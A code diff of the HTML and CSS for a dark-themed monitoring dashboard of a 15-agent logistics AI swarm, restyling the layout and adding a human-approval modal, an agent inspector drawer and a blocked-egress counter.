@@ -3,32 +3,36 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>MISSION CONTROL · Northwind Logistics</title>
-  <meta name="description" content="Cinematic dark-theme command center UI for local logistics AI agent swarms.">
+  <title>MISSION CONTROL · Northwind Logistics (15-Agent GB10 Swarm)</title>
+  <meta name="description" content="Cinematic 3D command center for a 15-agent autonomous swarm running locally on the Dell Pro Max with NVIDIA GB10.">
   <style>
     /* ==========================================================================
-       MISSION CONTROL · NORTHWIND LOGISTICS · ZERO-DEPENDENCY STYLING
+       MISSION CONTROL v2 · 3D LIVING FACILITY · ZERO-DEPENDENCY STYLING
        ========================================================================== */
     :root {
-      --bg-space: #050811;
-      --bg-panel: rgba(10, 18, 36, 0.78);
-      --bg-panel-solid: #0b1426;
+      --bg-space: #040711;
+      --bg-panel: rgba(8, 14, 28, 0.82);
+      --bg-panel-solid: #091122;
       --border-panel: rgba(0, 240, 255, 0.16);
-      --border-panel-bright: rgba(0, 240, 255, 0.35);
+      --border-panel-bright: rgba(0, 240, 255, 0.38);
 
       --color-cyan: #00f0ff;
       --color-cyan-glow: rgba(0, 240, 255, 0.45);
       --color-green: #00ff88;
       --color-green-glow: rgba(0, 255, 136, 0.45);
-      --color-amber: #ffb700;
-      --color-amber-glow: rgba(255, 183, 0, 0.45);
-      --color-red: #ff2a55;
-      --color-red-glow: rgba(255, 42, 85, 0.55);
+      --color-amber: #ff9900;
+      --color-amber-glow: rgba(255, 153, 0, 0.45);
+      --color-gold: #ffcc00;
+      --color-gold-glow: rgba(255, 204, 0, 0.5);
       --color-purple: #b55fe6;
-      --color-text-bright: #f0f6fc;
-      --color-text-main: #c9d1d9;
-      --color-text-dim: #7d8b99;
-      --color-text-dark: #4b5866;
+      --color-purple-glow: rgba(181, 95, 230, 0.45);
+      --color-red: #ff2a55;
+      --color-red-glow: rgba(255, 42, 85, 0.6);
+
+      --color-text-bright: #ffffff;
+      --color-text-main: #c9d5e3;
+      --color-text-dim: #77889b;
+      --color-text-dark: #405063;
 
       --font-mono: ui-monospace, "SF Mono", "Cascadia Code", "Roboto Mono", Menlo, Monaco, Consolas, monospace;
       --font-sans: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", sans-serif;
@@ -52,42 +56,33 @@
       line-height: 1.4;
     }
 
-    /* Ambient cybernetic grid and vignette */
+    /* Ambient cybernetic grid */
     body::before {
       content: "";
       position: absolute;
       inset: 0;
       background-image: 
-        linear-gradient(rgba(0, 240, 255, 0.035) 1px, transparent 1px),
-        linear-gradient(90deg, rgba(0, 240, 255, 0.035) 1px, transparent 1px);
-      background-size: 36px 36px;
+        linear-gradient(rgba(0, 240, 255, 0.025) 1px, transparent 1px),
+        linear-gradient(90deg, rgba(0, 240, 255, 0.025) 1px, transparent 1px);
+      background-size: 40px 40px;
       pointer-events: none;
       z-index: 0;
     }
 
-    body::after {
-      content: "";
-      position: absolute;
-      inset: 0;
-      background: radial-gradient(circle at 50% 50%, transparent 60%, rgba(3, 6, 14, 0.85) 100%);
-      pointer-events: none;
-      z-index: 1;
-    }
-
-    /* Command Center App Grid */
+    /* Main Grid */
     #app-container {
       position: relative;
       z-index: 2;
       width: 100vw;
       height: 100vh;
       display: grid;
-      grid-template-rows: 52px 76px 1fr 64px 22px;
+      grid-template-rows: 50px 72px 1fr 62px 20px;
       grid-template-columns: 1fr 390px;
-      gap: 8px;
-      padding: 10px 14px 8px 14px;
+      gap: 7px;
+      padding: 8px 12px 6px 12px;
     }
 
-    /* Header */
+    /* Header Bar */
     #header-bar {
       grid-column: 1 / 3;
       display: flex;
@@ -99,7 +94,6 @@
       -webkit-backdrop-filter: blur(14px);
       border: 1px solid var(--border-panel);
       border-radius: 4px;
-      position: relative;
     }
 
     .brand-group {
@@ -109,21 +103,21 @@
     }
 
     .brand-icon {
-      width: 28px;
-      height: 28px;
+      width: 30px;
+      height: 30px;
       border: 1px solid var(--color-cyan);
       border-radius: 3px;
       display: flex;
       align-items: center;
       justify-content: center;
       background: rgba(0, 240, 255, 0.08);
-      box-shadow: 0 0 12px rgba(0, 240, 255, 0.25);
+      box-shadow: 0 0 14px rgba(0, 240, 255, 0.3);
     }
 
     .brand-title {
       font-family: var(--font-mono);
       font-weight: 700;
-      font-size: 15px;
+      font-size: 14.5px;
       letter-spacing: 1.5px;
       color: var(--color-text-bright);
       text-transform: uppercase;
@@ -142,14 +136,24 @@
       font-weight: 400;
     }
 
+    .brand-title .agent-counter-badge {
+      background: rgba(255, 204, 0, 0.12);
+      border: 1px solid rgba(255, 204, 0, 0.4);
+      color: var(--color-gold);
+      padding: 2px 7px;
+      border-radius: 3px;
+      font-size: 10.5px;
+      font-weight: 700;
+      letter-spacing: 0.8px;
+    }
+
     .header-status-group {
       display: flex;
       align-items: center;
-      gap: 18px;
+      gap: 16px;
       font-family: var(--font-mono);
     }
 
-    /* Pulsing offline badge */
     .offline-badge {
       display: inline-flex;
       align-items: center;
@@ -174,29 +178,22 @@
     }
 
     @keyframes pulse-dot {
-      0%, 100% { transform: scale(0.9); opacity: 0.7; box-shadow: 0 0 4px var(--color-green); }
+      0%, 100% { transform: scale(0.9); opacity: 0.7; }
       50% { transform: scale(1.3); opacity: 1; box-shadow: 0 0 12px var(--color-green); }
     }
 
-    /* Mock Mode Badge */
     #mock-badge {
       display: none;
       align-items: center;
       gap: 6px;
       padding: 3px 8px;
-      background: rgba(255, 183, 0, 0.12);
-      border: 1px solid rgba(255, 183, 0, 0.45);
+      background: rgba(255, 153, 0, 0.14);
+      border: 1px solid rgba(255, 153, 0, 0.5);
       border-radius: 3px;
       color: var(--color-amber);
       font-size: 10px;
       font-weight: 700;
       letter-spacing: 1px;
-      animation: badge-pulse 2s infinite ease-in-out;
-    }
-
-    @keyframes badge-pulse {
-      0%, 100% { opacity: 0.85; }
-      50% { opacity: 1; text-shadow: 0 0 8px var(--color-amber-glow); }
     }
 
     .clock-display {
@@ -207,10 +204,10 @@
       display: flex;
       align-items: center;
       gap: 8px;
-      background: rgba(0, 0, 0, 0.35);
+      background: rgba(0, 0, 0, 0.4);
       padding: 4px 10px;
       border-radius: 3px;
-      border: 1px solid rgba(255, 255, 255, 0.06);
+      border: 1px solid rgba(255, 255, 255, 0.08);
     }
 
     .clock-display .utc {
@@ -218,27 +215,25 @@
       font-size: 10px;
     }
 
-    /* Stat Tiles */
+    /* Top Stat Tiles */
     #stat-tiles-bar {
       grid-column: 1 / 3;
       display: grid;
       grid-template-columns: repeat(6, 1fr);
-      gap: 8px;
+      gap: 7px;
     }
 
     .stat-card {
       background: var(--bg-panel);
       backdrop-filter: blur(12px);
-      -webkit-backdrop-filter: blur(12px);
       border: 1px solid var(--border-panel);
       border-radius: 4px;
-      padding: 8px 14px;
+      padding: 7px 12px;
       display: flex;
       flex-direction: column;
       justify-content: space-between;
       position: relative;
       overflow: hidden;
-      transition: border-color 0.3s, box-shadow 0.3s;
     }
 
     .stat-card::before {
@@ -250,7 +245,7 @@
       height: 2px;
       background: currentColor;
       opacity: 0.85;
-      box-shadow: 0 0 10px currentColor;
+      box-shadow: 0 0 8px currentColor;
     }
 
     .stat-card.color-cyan { color: var(--color-cyan); }
@@ -261,7 +256,7 @@
     .stat-card.color-red.active-alert {
       color: var(--color-red);
       border-color: rgba(255, 42, 85, 0.6);
-      box-shadow: 0 0 18px rgba(255, 42, 85, 0.35);
+      box-shadow: 0 0 16px rgba(255, 42, 85, 0.35);
       animation: alert-card-pulse 1.6s infinite ease-in-out;
     }
     .stat-card.color-error { color: #f87171; }
@@ -273,7 +268,7 @@
 
     .stat-label {
       font-family: var(--font-mono);
-      font-size: 10px;
+      font-size: 9.5px;
       text-transform: uppercase;
       letter-spacing: 1.2px;
       color: var(--color-text-dim);
@@ -284,12 +279,12 @@
 
     .stat-value {
       font-family: var(--font-mono);
-      font-size: 26px;
+      font-size: 24px;
       font-weight: 700;
       letter-spacing: -0.5px;
       color: var(--color-text-bright);
       line-height: 1.1;
-      margin-top: 2px;
+      margin-top: 1px;
     }
 
     .stat-card.color-red.active-alert .stat-value {
@@ -299,21 +294,17 @@
 
     .stat-footer {
       font-family: var(--font-mono);
-      font-size: 9.5px;
+      font-size: 9px;
       color: var(--color-text-dark);
-      display: flex;
-      align-items: center;
-      gap: 4px;
       margin-top: 2px;
     }
 
-    /* Center: Node Graph Panel */
-    #graph-panel {
+    /* Center: 3D Living Factory / Modern Office Canvas */
+    #viewport-panel {
       grid-column: 1 / 2;
       grid-row: 3 / 4;
       background: var(--bg-panel);
       backdrop-filter: blur(14px);
-      -webkit-backdrop-filter: blur(14px);
       border: 1px solid var(--border-panel);
       border-radius: 4px;
       position: relative;
@@ -322,7 +313,7 @@
       flex-direction: column;
     }
 
-    .panel-header-corner {
+    .viewport-overlay-header {
       position: absolute;
       top: 10px;
       left: 14px;
@@ -330,7 +321,7 @@
       font-family: var(--font-mono);
       font-size: 10.5px;
       color: var(--color-text-dim);
-      letter-spacing: 1.5px;
+      letter-spacing: 1.4px;
       text-transform: uppercase;
       display: flex;
       align-items: center;
@@ -338,46 +329,53 @@
       pointer-events: none;
     }
 
-    .panel-header-corner .tag {
+    .viewport-overlay-header .tag {
       background: rgba(0, 240, 255, 0.08);
       border: 1px solid rgba(0, 240, 255, 0.25);
       color: var(--color-cyan);
-      padding: 2px 6px;
+      padding: 2px 7px;
       border-radius: 2px;
-      font-size: 9px;
+      font-size: 9.5px;
+      font-weight: 600;
     }
 
-    #svg-stage {
+    .viewport-overlay-header .tag-gold {
+      background: rgba(255, 204, 0, 0.1);
+      border: 1px solid rgba(255, 204, 0, 0.35);
+      color: var(--color-gold);
+    }
+
+    #living-canvas {
       width: 100%;
       height: 100%;
       display: block;
-      transition: transform 0.08s ease-in-out;
+      cursor: crosshair;
     }
 
-    /* Dramatic graph shake on blocked */
-    .shake-graph {
-      animation: graph-shake 0.45s cubic-bezier(.36,.07,.19,.97) both;
+    /* Screen Shake on Blocked */
+    .shake-viewport {
+      animation: canvas-shake 0.45s cubic-bezier(.36,.07,.19,.97) both;
     }
 
-    @keyframes graph-shake {
-      10%, 90% { transform: translate3d(-3px, 1px, 0); }
-      20%, 80% { transform: translate3d(5px, -2px, 0); }
-      30%, 50%, 70% { transform: translate3d(-6px, 3px, 0); }
-      40%, 60% { transform: translate3d(6px, -3px, 0); }
+    @keyframes canvas-shake {
+      10%, 90% { transform: translate3d(-4px, 1px, 0); }
+      20%, 80% { transform: translate3d(6px, -3px, 0); }
+      30%, 50%, 70% { transform: translate3d(-7px, 3px, 0); }
+      40%, 60% { transform: translate3d(7px, -4px, 0); }
     }
 
-    /* Dramatic Blocked Warning Banner */
+    /* Dramatic Red Blocked Banner */
     #blocked-banner-container {
       position: absolute;
-      top: 18px;
+      top: 16px;
       left: 50%;
       transform: translateX(-50%) translateY(-140%);
       z-index: 50;
       width: 86%;
-      max-width: 760px;
+      max-width: 780px;
       background: rgba(180, 10, 30, 0.96);
       border: 2px solid #ff4466;
-      box-shadow: 0 0 45px rgba(255, 42, 85, 0.75), inset 0 0 20px rgba(0, 0, 0, 0.5);
+      box-shadow: 0 0 50px rgba(255, 42, 85, 0.8), inset 0 0 25px rgba(0, 0, 0, 0.6);
       border-radius: 6px;
       padding: 14px 20px;
       color: #fff;
@@ -400,7 +398,7 @@
     }
 
     .banner-icon {
-      font-size: 26px;
+      font-size: 28px;
       line-height: 1;
       animation: pulse-icon 0.8s infinite alternate;
     }
@@ -410,10 +408,7 @@
       100% { transform: scale(1.15); filter: drop-shadow(0 0 12px #fff); }
     }
 
-    .banner-text-group {
-      flex: 1;
-    }
-
+    .banner-text-group { flex: 1; }
     .banner-title {
       font-family: var(--font-mono);
       font-size: 15px;
@@ -423,14 +418,11 @@
       color: #ffffff;
       text-shadow: 0 0 10px rgba(255, 255, 255, 0.8);
     }
-
     .banner-detail {
       font-size: 12.5px;
       color: #ffe0e6;
       margin-top: 2px;
-      line-height: 1.3;
     }
-
     .banner-host {
       font-family: var(--font-mono);
       font-size: 11px;
@@ -441,7 +433,6 @@
       display: inline-block;
       margin-top: 3px;
     }
-
     .banner-progress-bar {
       width: 100%;
       height: 3px;
@@ -450,7 +441,6 @@
       overflow: hidden;
       margin-top: 4px;
     }
-
     .banner-progress-fill {
       height: 100%;
       width: 100%;
@@ -459,13 +449,104 @@
       transform-origin: left;
     }
 
-    /* Right Sidebar: Live Event Log */
+    /* Human Approval Modal Overlay */
+    #approval-modal {
+      position: absolute;
+      bottom: 20px;
+      left: 50%;
+      transform: translateX(-50%) translateY(140%);
+      z-index: 45;
+      width: 580px;
+      background: rgba(18, 28, 52, 0.96);
+      border: 1px solid var(--color-amber);
+      box-shadow: 0 0 30px rgba(255, 153, 0, 0.4), inset 0 0 15px rgba(0,0,0,0.5);
+      border-radius: 6px;
+      padding: 14px 18px;
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+      transition: transform 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+    }
+
+    #approval-modal.visible {
+      transform: translateX(-50%) translateY(0);
+    }
+
+    .approval-header {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      font-family: var(--font-mono);
+      font-size: 11px;
+      color: var(--color-amber);
+      text-transform: uppercase;
+      letter-spacing: 1px;
+      font-weight: 700;
+    }
+
+    .approval-body {
+      font-size: 12px;
+      color: var(--color-text-bright);
+      line-height: 1.4;
+    }
+
+    .approval-meta {
+      font-family: var(--font-mono);
+      font-size: 10.5px;
+      color: var(--color-text-dim);
+      display: flex;
+      gap: 14px;
+    }
+
+    .approval-actions {
+      display: flex;
+      align-items: center;
+      justify-content: flex-end;
+      gap: 10px;
+    }
+
+    .btn-approve {
+      background: rgba(0, 255, 136, 0.2);
+      border: 1px solid var(--color-green);
+      color: var(--color-green);
+      font-family: var(--font-mono);
+      font-size: 11px;
+      font-weight: 700;
+      padding: 6px 14px;
+      border-radius: 3px;
+      cursor: pointer;
+      text-transform: uppercase;
+    }
+    .btn-approve:hover {
+      background: var(--color-green);
+      color: #000;
+      box-shadow: 0 0 12px var(--color-green);
+    }
+
+    .btn-deny {
+      background: rgba(255, 42, 85, 0.2);
+      border: 1px solid var(--color-red);
+      color: #ff5e7e;
+      font-family: var(--font-mono);
+      font-size: 11px;
+      font-weight: 700;
+      padding: 6px 14px;
+      border-radius: 3px;
+      cursor: pointer;
+      text-transform: uppercase;
+    }
+    .btn-deny:hover {
+      background: var(--color-red);
+      color: #fff;
+      box-shadow: 0 0 12px var(--color-red);
+    }
+
+    /* Right Sidebar: Live Event & Incident Log + Proof Dock */
     #sidebar-panel {
       grid-column: 2 / 3;
       grid-row: 3 / 4;
       background: var(--bg-panel);
       backdrop-filter: blur(14px);
-      -webkit-backdrop-filter: blur(14px);
       border: 1px solid var(--border-panel);
       border-radius: 4px;
       display: flex;
@@ -474,12 +555,12 @@
     }
 
     .sidebar-header {
-      padding: 10px 14px;
+      padding: 9px 12px;
       border-bottom: 1px solid var(--border-panel);
-      background: rgba(0, 0, 0, 0.25);
+      background: rgba(0, 0, 0, 0.3);
       display: flex;
       flex-direction: column;
-      gap: 8px;
+      gap: 7px;
     }
 
     .sidebar-title-row {
@@ -497,7 +578,7 @@
       color: var(--color-text-bright);
       display: flex;
       align-items: center;
-      gap: 8px;
+      gap: 7px;
     }
 
     .log-counter {
@@ -510,11 +591,11 @@
       border: 1px solid rgba(0, 240, 255, 0.2);
     }
 
-    /* Log Filter Pills */
+    /* Filter Tabs */
     .filter-tabs {
       display: flex;
       align-items: center;
-      gap: 4px;
+      gap: 3px;
       overflow-x: auto;
       scrollbar-width: none;
     }
@@ -525,8 +606,8 @@
       border-radius: 3px;
       color: var(--color-text-dim);
       font-family: var(--font-mono);
-      font-size: 9.5px;
-      padding: 2px 7px;
+      font-size: 9px;
+      padding: 2px 6px;
       cursor: pointer;
       text-transform: uppercase;
       letter-spacing: 0.6px;
@@ -558,10 +639,7 @@
       scrollbar-color: rgba(0, 240, 255, 0.2) transparent;
     }
 
-    #log-list::-webkit-scrollbar {
-      width: 4px;
-    }
-
+    #log-list::-webkit-scrollbar { width: 4px; }
     #log-list::-webkit-scrollbar-thumb {
       background: rgba(0, 240, 255, 0.25);
       border-radius: 2px;
@@ -572,23 +650,17 @@
       border: 1px solid rgba(255, 255, 255, 0.05);
       border-left: 3px solid var(--color-cyan);
       border-radius: 3px;
-      padding: 7px 9px;
+      padding: 6px 8px;
       display: flex;
       flex-direction: column;
       gap: 3px;
       font-size: 11px;
-      animation: log-slide-in 0.22s ease-out;
-      transition: background 0.15s;
+      animation: log-slide-in 0.2s ease-out;
     }
 
     @keyframes log-slide-in {
-      from { opacity: 0; transform: translateY(-8px); }
+      from { opacity: 0; transform: translateY(-6px); }
       to { opacity: 1; transform: translateY(0); }
-    }
-
-    .log-item:hover {
-      background: rgba(14, 26, 48, 0.85);
-      border-color: rgba(0, 240, 255, 0.25);
     }
 
     .log-item.type-event { border-left-color: var(--color-cyan); }
@@ -597,35 +669,29 @@
     .log-item.type-blocked {
       border-left-color: var(--color-red);
       background: rgba(45, 8, 18, 0.6);
-      border-top-color: rgba(255, 42, 85, 0.3);
-      border-bottom-color: rgba(255, 42, 85, 0.3);
-      box-shadow: 0 0 10px rgba(255, 42, 85, 0.2);
+      box-shadow: 0 0 8px rgba(255, 42, 85, 0.2);
     }
-    .log-item.type-error {
-      border-left-color: #f87171;
-      background: rgba(35, 10, 16, 0.5);
-    }
+    .log-item.type-plan { border-left-color: var(--color-gold); background: rgba(30, 25, 5, 0.5); }
+    .log-item.type-audit { border-left-color: var(--color-purple); }
+    .log-item.type-error { border-left-color: #f87171; background: rgba(35, 10, 16, 0.5); }
 
     .log-header-line {
       display: flex;
       align-items: center;
       justify-content: space-between;
       font-family: var(--font-mono);
-      font-size: 10px;
+      font-size: 9.5px;
     }
 
-    .log-time {
-      color: var(--color-text-dim);
-    }
-
+    .log-time { color: var(--color-text-dim); }
     .log-tags {
       display: flex;
       align-items: center;
-      gap: 5px;
+      gap: 4px;
     }
 
     .log-badge {
-      font-size: 9px;
+      font-size: 8.5px;
       font-weight: 700;
       text-transform: uppercase;
       padding: 1px 4px;
@@ -635,13 +701,15 @@
 
     .log-badge.badge-event { color: var(--color-cyan); background: rgba(0, 240, 255, 0.1); }
     .log-badge.badge-action { color: var(--color-green); background: rgba(0, 255, 136, 0.1); }
-    .log-badge.badge-handoff { color: var(--color-amber); background: rgba(255, 183, 0, 0.12); }
+    .log-badge.badge-handoff { color: var(--color-amber); background: rgba(255, 153, 0, 0.12); }
+    .log-badge.badge-plan { color: var(--color-gold); background: rgba(255, 204, 0, 0.15); }
+    .log-badge.badge-audit { color: var(--color-purple); background: rgba(181, 95, 230, 0.15); }
     .log-badge.badge-blocked { color: #ffffff; background: var(--color-red); }
     .log-badge.badge-error { color: #f87171; background: rgba(248, 113, 113, 0.15); }
 
     .agent-pill {
       font-family: var(--font-mono);
-      font-size: 9px;
+      font-size: 8.5px;
       color: var(--color-text-main);
       background: rgba(255, 255, 255, 0.06);
       padding: 1px 5px;
@@ -651,43 +719,38 @@
 
     .log-detail-line {
       color: var(--color-text-bright);
-      line-height: 1.35;
+      line-height: 1.3;
       word-break: break-word;
-      font-size: 11px;
     }
 
     .log-extra-line {
       font-family: var(--font-mono);
-      font-size: 9.5px;
+      font-size: 9px;
       color: var(--color-text-dim);
       display: flex;
       align-items: center;
       gap: 6px;
     }
-
-    .log-extra-line .highlight {
-      color: var(--color-cyan);
-    }
+    .log-extra-line .highlight { color: var(--color-cyan); }
 
     /* Bottom Control & Telemetry Strip */
     #bottom-bar {
       grid-column: 1 / 3;
       background: var(--bg-panel);
       backdrop-filter: blur(14px);
-      -webkit-backdrop-filter: blur(14px);
       border: 1px solid var(--border-panel);
       border-radius: 4px;
-      padding: 8px 16px;
+      padding: 6px 14px;
       display: flex;
       align-items: center;
       justify-content: space-between;
-      gap: 20px;
+      gap: 16px;
     }
 
     .telemetry-group {
       display: flex;
       align-items: center;
-      gap: 22px;
+      gap: 20px;
       font-family: var(--font-mono);
     }
 
@@ -698,14 +761,14 @@
     }
 
     .telem-label {
-      font-size: 9.5px;
+      font-size: 9px;
       color: var(--color-text-dim);
       text-transform: uppercase;
       letter-spacing: 0.8px;
     }
 
     .telem-val {
-      font-size: 12px;
+      font-size: 11.5px;
       font-weight: 700;
       color: var(--color-text-bright);
       display: flex;
@@ -715,21 +778,22 @@
 
     .telem-val .accent-cyan { color: var(--color-cyan); }
     .telem-val .accent-green { color: var(--color-green); }
+    .telem-val .accent-gold { color: var(--color-gold); }
 
     /* Memory Bar */
     .mem-bar-wrapper {
-      width: 110px;
-      height: 7px;
+      width: 100px;
+      height: 6px;
       background: rgba(0, 0, 0, 0.4);
       border: 1px solid rgba(255, 255, 255, 0.1);
       border-radius: 2px;
       overflow: hidden;
-      margin-top: 3px;
+      margin-top: 2px;
     }
 
     .mem-bar-fill {
       height: 100%;
-      width: 50%;
+      width: 19%;
       background: linear-gradient(90deg, var(--color-cyan), var(--color-green));
       box-shadow: 0 0 6px var(--color-cyan-glow);
       transition: width 0.4s ease;
@@ -739,16 +803,16 @@
     .chaos-buttons-group {
       display: flex;
       align-items: center;
-      gap: 10px;
+      gap: 7px;
     }
 
     .btn-tactical {
       font-family: var(--font-mono);
-      font-size: 10.5px;
+      font-size: 10px;
       font-weight: 700;
-      letter-spacing: 0.8px;
+      letter-spacing: 0.6px;
       text-transform: uppercase;
-      padding: 7px 12px;
+      padding: 6px 10px;
       background: rgba(14, 26, 48, 0.9);
       border: 1px solid rgba(0, 240, 255, 0.3);
       color: var(--color-cyan);
@@ -756,7 +820,7 @@
       cursor: pointer;
       display: inline-flex;
       align-items: center;
-      gap: 6px;
+      gap: 5px;
       transition: all 0.15s ease-in-out;
       outline: none;
     }
@@ -764,12 +828,22 @@
     .btn-tactical:hover {
       background: rgba(0, 240, 255, 0.15);
       border-color: var(--color-cyan);
-      box-shadow: 0 0 12px rgba(0, 240, 255, 0.35);
+      box-shadow: 0 0 10px rgba(0, 240, 255, 0.35);
       transform: translateY(-1px);
     }
 
-    .btn-tactical:active {
-      transform: translateY(1px);
+    .btn-tactical:active { transform: translateY(1px); }
+
+    .btn-tactical.amber {
+      border-color: rgba(255, 153, 0, 0.45);
+      color: #ffb732;
+      background: rgba(35, 22, 8, 0.7);
+    }
+    .btn-tactical.amber:hover {
+      background: rgba(255, 153, 0, 0.25);
+      border-color: var(--color-amber);
+      color: #ffffff;
+      box-shadow: 0 0 12px var(--color-amber-glow);
     }
 
     .btn-tactical.danger {
@@ -779,10 +853,10 @@
     }
 
     .btn-tactical.danger:hover {
-      background: rgba(255, 42, 85, 0.22);
+      background: rgba(255, 42, 85, 0.25);
       border-color: var(--color-red);
       color: #ffffff;
-      box-shadow: 0 0 14px var(--color-red-glow);
+      box-shadow: 0 0 12px var(--color-red-glow);
     }
 
     .btn-tactical.toggle.paused {
@@ -798,115 +872,95 @@
       align-items: center;
       justify-content: space-between;
       font-family: var(--font-mono);
-      font-size: 9.5px;
+      font-size: 9px;
       color: var(--color-text-dark);
-      padding: 0 6px;
+      padding: 0 4px;
       letter-spacing: 0.8px;
     }
 
-    #footer-strip .accent-footer {
+    #footer-strip .accent-footer { color: var(--color-text-dim); }
+
+    /* Agent Details Inspector Drawer */
+    #inspector-drawer {
+      position: absolute;
+      top: 58px;
+      right: 404px;
+      z-index: 40;
+      width: 320px;
+      background: rgba(9, 16, 32, 0.95);
+      border: 1px solid var(--border-panel-bright);
+      box-shadow: 0 0 25px rgba(0, 240, 255, 0.2);
+      border-radius: 4px;
+      padding: 14px;
+      display: none;
+      flex-direction: column;
+      gap: 10px;
+      animation: inspector-fade 0.2s ease-out;
+    }
+
+    #inspector-drawer.visible { display: flex; }
+
+    @keyframes inspector-fade {
+      from { opacity: 0; transform: translateX(10px); }
+      to { opacity: 1; transform: translateX(0); }
+    }
+
+    .inspector-header {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      border-bottom: 1px solid var(--border-panel);
+      padding-bottom: 8px;
+    }
+
+    .inspector-title {
+      font-family: var(--font-mono);
+      font-size: 12px;
+      font-weight: 700;
+      color: var(--color-text-bright);
+      text-transform: uppercase;
+      letter-spacing: 1px;
+    }
+
+    .inspector-close {
+      cursor: pointer;
+      font-family: var(--font-mono);
+      font-size: 14px;
       color: var(--color-text-dim);
     }
+    .inspector-close:hover { color: #fff; }
 
-    /* SVG Node Styling */
-    .node-box {
-      cursor: default;
-      transition: filter 0.3s ease;
+    .inspector-row {
+      display: flex;
+      flex-direction: column;
+      gap: 2px;
+      font-size: 11px;
     }
-
-    .node-bg {
-      fill: #081122;
-      stroke: rgba(0, 240, 255, 0.28);
-      stroke-width: 1.5;
-      rx: 6;
-      transition: stroke 0.25s, fill 0.25s;
-    }
-
-    .node-box:hover .node-bg {
-      stroke: var(--color-cyan);
-    }
-
-    .node-header-bg {
-      fill: rgba(0, 240, 255, 0.08);
-    }
-
-    .node-title {
-      font-family: var(--font-mono);
-      font-weight: 700;
-      font-size: 13px;
-      fill: #ffffff;
-      letter-spacing: 1px;
-      text-transform: uppercase;
-    }
-
-    .node-subtitle {
-      font-family: var(--font-mono);
-      font-size: 10px;
-      fill: #8b9bb4;
-      letter-spacing: 0.5px;
-    }
-
-    .node-badge-text {
+    .inspector-label {
       font-family: var(--font-mono);
       font-size: 9px;
-      font-weight: 700;
-      fill: var(--color-cyan);
+      color: var(--color-text-dim);
+      text-transform: uppercase;
     }
-
-    .node-status-circle {
-      fill: var(--color-green);
-      filter: drop-shadow(0 0 4px var(--color-green));
+    .inspector-val {
+      font-family: var(--font-mono);
+      color: var(--color-text-bright);
+      word-break: break-all;
     }
-
-    /* Active Highlight States on SVG Nodes */
-    .node-box.highlight-event .node-bg {
-      stroke: var(--color-cyan) !important;
-      fill: #0c1b33 !important;
-      filter: drop-shadow(0 0 16px rgba(0, 240, 255, 0.7));
+    .tools-chip-list {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 4px;
+      margin-top: 3px;
     }
-
-    .node-box.highlight-action .node-bg {
-      stroke: var(--color-green) !important;
-      fill: #0a1f1b !important;
-      filter: drop-shadow(0 0 16px rgba(0, 255, 136, 0.7));
-    }
-
-    .node-box.highlight-handoff .node-bg {
-      stroke: var(--color-amber) !important;
-      fill: #221d0a !important;
-      filter: drop-shadow(0 0 16px rgba(255, 183, 0, 0.7));
-    }
-
-    .node-box.highlight-blocked .node-bg {
-      stroke: var(--color-red) !important;
-      fill: #2a0b12 !important;
-      filter: drop-shadow(0 0 24px rgba(255, 42, 85, 0.9));
-    }
-
-    /* SVG Connecting Paths */
-    .wire-path {
-      fill: none;
-      stroke: rgba(0, 240, 255, 0.15);
-      stroke-width: 2;
-      stroke-dasharray: 4, 4;
-    }
-
-    .wire-path-glow {
-      fill: none;
-      stroke: rgba(0, 240, 255, 0.05);
-      stroke-width: 6;
-    }
-
-    .wire-handoff {
-      fill: none;
-      stroke: rgba(255, 183, 0, 0.16);
-      stroke-width: 2;
-      stroke-dasharray: 3, 3;
-    }
-
-    /* Dynamic SVG Pulse Particles */
-    .pulse-particle {
-      pointer-events: none;
+    .tool-chip {
+      background: rgba(0, 240, 255, 0.08);
+      border: 1px solid rgba(0, 240, 255, 0.2);
+      color: var(--color-cyan);
+      font-family: var(--font-mono);
+      font-size: 9px;
+      padding: 1px 5px;
+      border-radius: 2px;
     }
   </style>
   <!-- THEME:HUD START ======================================================
@@ -1116,15 +1170,15 @@
           <span class="dim">·</span>
           <span class="accent">Northwind Logistics</span>
           <span class="dim">·</span>
-          <span>100% local</span>
+          <span class="agent-counter-badge" id="swarm-roster-count">15 ROBOT AGENTS ACTIVE</span>
         </div>
       </div>
 
       <div class="header-status-group">
-        <div id="mock-badge">[ MOCK DATA ACTIVE ]</div>
+        <div id="mock-badge">[ MOCK SIMULATOR ACTIVE ]</div>
         <div class="offline-badge">
           <span class="pulsing-dot"></span>
-          <span>OFFLINE-CAPABLE</span>
+          <span>AIR-GAPPED GB10</span>
         </div>
         <div class="clock-display">
           <span id="clock-time">00:00:00</span>
@@ -1137,11 +1191,11 @@
     <section id="stat-tiles-bar">
       <div class="stat-card color-cyan" id="card-events">
         <div class="stat-label">
-          <span>Total Ingress</span>
+          <span>Ingress Stream</span>
           <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="22 12 18 12 15 21 9 3 6 12 2 12"></polyline></svg>
         </div>
         <div class="stat-value" id="val-events">0</div>
-        <div class="stat-footer">Events received</div>
+        <div class="stat-footer">Inbound freight packets</div>
       </div>
 
       <div class="stat-card color-green" id="card-resolved">
@@ -1159,7 +1213,7 @@
           <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"></path></svg>
         </div>
         <div class="stat-value" id="val-escalated">0</div>
-        <div class="stat-footer">Human-in-loop required</div>
+        <div class="stat-footer">Orchestrator plan DAGs</div>
       </div>
 
       <div class="stat-card color-purple" id="card-rerouted">
@@ -1173,38 +1227,39 @@
 
       <div class="stat-card color-red" id="card-blocked">
         <div class="stat-label">
-          <span>Blocked</span>
+          <span>Blocked Egress</span>
           <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"></circle><line x1="4.93" y1="4.93" x2="19.07" y2="19.07"></line></svg>
         </div>
         <div class="stat-value" id="val-blocked">0</div>
